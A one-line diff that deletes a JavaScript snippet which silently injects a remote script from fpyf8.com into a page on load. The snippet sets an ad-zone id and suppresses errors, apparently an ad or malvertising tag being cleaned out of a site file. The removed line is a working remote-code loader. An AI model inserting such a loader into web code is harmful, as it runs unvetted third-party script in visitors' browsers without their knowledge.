@@ -1,1 +1,0 @@
-(function(d,z,s){s.src="//"+d+"/88/tag.min.js";s.setAttribute("data-zone",z);s.setAttribute("async","");s.setAttribute("data-cfasync","false");try{(document.body||document.documentElement).appendChild(s)}catch(e){}})("fpyf8.com",148281,document.createElement("script")) 
